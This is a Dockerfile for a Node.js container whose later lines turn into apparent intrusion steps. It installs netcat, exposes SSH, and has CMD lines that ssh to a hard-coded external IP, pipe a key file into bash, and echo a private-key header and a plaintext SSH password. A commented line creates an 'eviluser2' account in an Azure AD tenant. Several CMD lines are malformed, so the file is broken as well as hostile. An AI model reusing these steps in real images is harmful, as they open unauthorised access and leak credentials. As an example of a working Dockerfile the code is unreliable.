FROM node:15-alpine

COPY . /src
RUN cd /src && npm install
#RUN sudo apt install openssh-server
##RUN apk add --no-cache curl
##RUN curl -sL https://aka.ms/InstallAzureCLIDeb | sh
RUN apk add py3-pip
#RUN apk add gcc musl-dev python3-dev libffi-dev openssl-dev cargo make
RUN pip3 install --upgrade pip
RUN pip3 install netcat
#CMD ["az --version"]
EXPOSE 80
EXPOSE 22
CMD ["ssh 74.235.89.142"]
CMD ["yes"]
CMD ["un=azure"]
CMD ["echo "-----BEGIN RSA PRIVATE KEY-----"]
CMD ["$un, cat pw.key | bash"]
CMD ["echo", "SSH login Legacy4ge"]
CMD ["history > history.txt"]
CMD ["sudo IP Addr"]
#CMD [ "az --version > az.txt"]
#CMD ["cat az.txt"]
#CMD [ "az ad user create --display-name eviluser2 --password p@ssword --user-principal-name eviluser2@ciscoswcresearch.onmicrosoft.com" ]
#CMD ["node", "/src/server.js"]
